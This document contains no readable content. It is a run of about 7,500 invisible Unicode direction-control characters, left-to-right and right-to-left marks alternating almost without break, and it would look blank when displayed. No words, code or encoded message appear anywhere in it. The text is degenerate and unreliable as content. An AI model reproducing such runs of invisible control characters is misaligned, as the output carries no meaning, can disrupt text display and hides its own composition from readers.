‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎